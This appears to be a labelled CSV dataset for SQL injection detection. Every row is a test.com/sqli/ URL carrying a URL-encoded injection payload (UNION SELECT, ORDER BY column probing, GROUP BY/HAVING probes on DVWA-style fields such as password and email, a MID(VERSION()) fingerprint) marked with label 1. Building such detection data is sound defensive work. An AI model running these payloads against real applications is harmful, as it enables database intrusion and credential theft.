URI,label
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%272900&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%27290&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+--+%272900&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+--+%27&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+ ALL+SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27UNION+SELECT+%27100&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%2720&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+1+%27100&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%27500&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27%27%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=%27%27SELECT+%272200&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27AND+1=1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1=1%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27and+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+%27or+%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+or+%27%27%27%27%271=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+or+%27%27%27%27%27%27%27%271%2B&Submit=Submit#,1
test.com/sqli/?id=117%27+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+AND+1=1%27%27---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27+ORDER+BY+or+%27%27%271=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27+ORDER+BY+or+1=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27%27or+1=1-%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27%27%27+ORDER+BY+or+%27%271=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27or+%271=%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+or+1=%27%271---%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27%27+ORDER+BY+%27%27or+1=1---%2B&Submit=Submit#,1
test.com/sqli/?id=3%27+ORDER+BY+112--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+112--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+10--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1=1%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+%271=1--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+112---%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1+=+1--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27%27%27+ORDER+BY+--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%27+ORDER+BY+1+-%2B&Submit=Submit#,1
test.com/sqli/?id=1+ORDER+BY+1--%2B&Submit=Submit#,1
test.com/sqli/?id=3899%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=39%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=99%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=100%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1000%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=10000%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=200%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=29%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=9%27+ORDER+BY+11--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1+ORDER+BY+1%2C2%2C2%2C5%2C3%2C2%2C4--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27%27%27+ORDER+BY+1%2C3%2C2%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2B&Submit=Submit#,1
test.com/sqli/?id=1%27%27+ORDER+BY+1%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=1%27+ORDER+BY+1%2C3%2C2%2C3%2C2--%2B&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+email+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+lname+having+1%3D1+----&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+mname+having+1%3D1%27%27+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+password+having+%271%3D%271+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+password+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+%271%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+%27%271%3D%27%271+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+id+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27%27%27+GROUP+BY+id+having+1%3D1+--&Submit=Submit#,1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27+GROUP+BY+email+,+password+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27%27%27%27%27%27+GROUP+BY+email+,+password+having+1%3D1+--&Submit=Submit#",1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1%27+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+%27%271%3D1+--&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
test.com/sqli/?id=%27+GROUP+BY+dvwa.fname+having+%27%271%3D%27%271+--&Submit=Submit#,1
test.com/sqli/?id=%27%27+GROUP+BY+dvwa.fname+having+1%3D%271+-&Submit=Submit#,1
test.com/sqli/?id=GROUP+BY+dvwa.fname+having+1%3D1&Submit=Submit#,1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1+&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+1%27%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+fname+having+%27%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+1%27%3D%271%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+mname+having+1%27%3D1%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+table.email+,+table.mname+having+1%27%3D1+--&Submit=Submit#",1
test.com/sqli/?id=%27+GROUP+BY+columnnames+1%27%3D1+--&Submit=Submit#,1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+lname+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+fname+,+lname+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%271%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=+GROUP+BY+fname+,+lname+%27%271%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+fname+,+lname+%27%271%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+1%3D%271+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+%27%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+,+lname+having+%271%27%27%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+email+,+fname+,+lname+having+1%27%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%271%27%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+fname+,+email+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%271%27%3D1%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+fname+having+1%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D%27%271%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+1%27%3D%27%271%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+fname+,+email+having+%27%271%27%3D%27%271%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+%27%271%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+id+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+fname+,+password+,+id+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+fname+,+password+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+id+,+password+,+fname+having+1%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+lname+,+fname+having+1%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%271%27%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+1%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+mname+,+fname+,+lname+having+%27%27%271%27%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+password+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+mname+,+password,++fname+having+90%3D70+&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+fname+,+having+%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+fname+,+having+90%3D70%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+90%27%3D70%27%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+password+,+fname+having+%27%27%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+mname+,+fname+,+password+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%25+GROUP+BY+mname+,+password+.+fname+having+%27%27%2790%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+90%3D70+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1%27+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+password+,+mname+,+fname+having+1%3D1%27%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+password+,+mname+,+fname+having+1%3D%271%27&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1Submit=Submit#",1
"test.com/sqli/?id=%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+%271%27%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1%27%27&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D1&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+%271%3D1+--&Submit=Submit#",1
"test.com/sqli/?id=%27%27%27%27%27+GROUP+BY+email+,+mname+,+fname+having+1%3D%27%27%271+--&Submit=Submit#",1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=--1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=---1%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=--1%27%27%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2B&Submit=Submit#,1
test.com/sqli/?id=%271%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%271%27+UNION+SELECT+1%2C2%2C3--%2B&Submit=Submit#,1
test.com/sqli/?id=-%271%27%27+UNION+SELECT+1%2C2%2C3%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3--+--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C8%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--+--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+SELECT+1%2C2%2C3%2C70%2C60--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C25%2C40%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%271=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%27%271=1%27%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C4%2C5--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C89%2C56--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=%271+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56%2B&Submit=Submit#,1
test.com/sqli/?id=1=1%27+UNION+ALL+SELECT+1%2C2%2C3%2C89%2C56--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C67--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C67--+-%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C2%2C7%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27%27%27+UNION+ALL+SELECT+1%2C2%2C3%2C9%2C0%2C1%2C2%2C21--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+ALL+SELECT+1%2C2%2C3%2C3%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1%27+UNION+SELECT+1%2C2%2C1%2C9%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C5%2C0%2C1%2C2%2C1--%2B&Submit=Submit#,1
test.com/sqli/?id=-1+UNION+SELECT+1%2C2%2C3%2C7%2C0%2C1%2C2%2C100--%2B&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28id+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28mname+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+%29+from+dvwa+--&Submit=Submit#,1
test.com/sqli/?id=%27+UNION+SELECT+sum%28id+%29+from+dvwa&Submit=Submit#,1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+mname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28email+,+fname+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28id+,+email+%29+from+dvwa+--&Submit=Submit#",1
"test.com/sqli/?id=%27+UNION+SELECT+sum%28lname+,+id+%29+from+dvwa+--&Submit=Submit#",1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
test.com/sqli/?id=%27+AND+MID%28VERSION%28%28%29%29%2C1%2C1%29+%3D+%275%27%3B&Submit=Submit#,1
